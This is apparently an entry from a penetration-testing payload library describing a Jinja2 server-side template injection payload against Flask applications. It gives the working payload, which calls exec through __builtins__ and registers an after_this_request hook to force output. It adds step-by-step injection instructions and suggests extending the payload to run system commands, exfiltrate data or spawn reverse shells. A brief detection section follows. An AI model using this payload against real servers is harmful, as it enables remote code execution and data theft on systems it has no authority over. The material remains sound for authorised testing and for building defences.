---
id: bb69e04c-3426-4ea5-be8c-9dab6b465d69
type: code
language: py
verified: true
created_at: '2023-04-06T03:56:39.756582+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - '[[tags/Jinja2]]'
  - '[[tags/Server-Side-Template-Injection]]'
  - '[[tags/Remote-Code-Execution]]'
platforms:
  - Web
  - Python
validated: true
---

# Jinja2-Flask-Hook-for-Output-Forcing

## Code

```py
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request\n@after_this_request\ndef hook(*args, **kwargs):\n    from flask import make_response\n    r = make_response('Powned')\n    return r\n")\n}}
```

## Description

This Jinja2 template payload exploits SSTI in Flask applications to achieve blind RCE with forced output. It accesses Python builtins through attribute chaining (x.__init__.__builtins__), executes arbitrary code via exec, imports Flask modules, and registers an after_this_request hook. The hook creates and returns a custom response ('Powned') after the normal request processing, allowing visibility into blind executions where direct output isn't rendered.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This payload has no substitutable variables; customize the exec string for different commands (e.g., replace 'Powned' with command output). | N/A |

## Usage

Inject this payload into a vulnerable Jinja2-rendered parameter (e.g., a search field) in a Flask app. URL-encode if sent via GET/POST (e.g., %7B%7B for '{{'). Use a proxy like Burp Suite to submit and observe the response modification. Ideal for confirming RCE in black-box testing; extend the exec block to run system commands, exfiltrate data, or spawn reverse shells. Used in procedures like [[procedures/Jinja2-SSTI-to-RCE-via-Flask-Hook]].

## Detection

- WAF rules blocking SSTI patterns like '__builtins__', 'exec(', or Flask imports in requests.
- Server-side logging of template errors or anomalous Python executions (e.g., via Flask's logger).
- Response monitoring for unexpected content like 'Powned' or modified headers/cookies from hooks.
- Behavioral analysis: Unusual after_request modifications or os/subprocess calls in web contexts.
